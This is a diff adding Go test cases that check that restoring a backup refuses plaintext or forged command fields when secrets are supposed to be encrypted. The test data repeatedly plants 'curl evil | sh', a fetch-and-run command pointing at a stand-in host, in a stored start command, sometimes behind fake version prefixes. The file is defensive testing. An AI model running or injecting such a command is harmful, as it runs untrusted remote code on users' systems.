@@ -424,6 +424,37 @@ func TestRestoreRefusesPlaintextInEncryptedBackup(t *testing.T) {
 			rawExec(t, p, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
 			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='curl evil | sh' WHERE id=?`, a)
 		}, nil, false},
+		"v1-shaped payload, stripped": {func(t *testing.T, p string, a int64) {
+			rawExec(t, p, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
+			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='pmss1:;curl evil | sh' WHERE id=?`, a)
+		}, []Option{sealA}, true},
+		"v3-shaped payload, stripped": {func(t *testing.T, p string, a int64) {
+			rawExec(t, p, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
+			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='pmss3:;curl evil | sh' WHERE id=?`, a)
+		}, []Option{sealA}, true},
+		"v2-shaped payload, stripped": {func(t *testing.T, p string, a int64) {
+			rawExec(t, p, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
+			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='pmss2:;curl evil | sh' WHERE id=?`, a)
+		}, []Option{sealA}, true},
+		"v1-shaped payload, marked plain": {func(t *testing.T, p string, a int64) {
+			rawExec(t, p, `DELETE FROM settings WHERE key='secrets_check'`)
+			rawExec(t, p, `UPDATE settings SET value='0' WHERE key='secrets_sealed'`)
+			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='pmss1:;curl evil | sh' WHERE id=?`, a)
+		}, []Option{sealA}, true},
+		"v3-shaped payload, marked plain": {func(t *testing.T, p string, a int64) {
+			rawExec(t, p, `DELETE FROM settings WHERE key='secrets_check'`)
+			rawExec(t, p, `UPDATE settings SET value='0' WHERE key='secrets_sealed'`)
+			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='pmss3:;curl evil | sh' WHERE id=?`, a)
+		}, []Option{sealA}, true},
+		"v2-shaped payload, marked plain": {func(t *testing.T, p string, a int64) {
+			rawExec(t, p, `DELETE FROM settings WHERE key='secrets_check'`)
+			rawExec(t, p, `UPDATE settings SET value='0' WHERE key='secrets_sealed'`)
+			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='pmss2:;curl evil | sh' WHERE id=?`, a)
+		}, []Option{sealA}, true},
+		"v2 in a setting": {func(t *testing.T, p string, _ int64) {
+			rawExec(t, p, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
+			rawExec(t, p, `INSERT OR REPLACE INTO settings(key, value) VALUES('qbt_download_url', ?)`, mustSealer(t, backupKeyA).SealBound(labelQbtDownloadURL, "", "http://x"))
+		}, nil, false},
 		"everything stripped, secret configured": {func(t *testing.T, p string, a int64) {
 			rawExec(t, p, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
 			rawExec(t, p, `UPDATE boxes SET password='', qbt_pass='', qbt_start_cmd=''`)
